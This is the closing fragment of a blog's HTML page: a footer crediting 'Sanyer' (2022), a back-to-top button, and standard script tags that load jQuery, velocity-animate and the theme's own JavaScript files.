class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
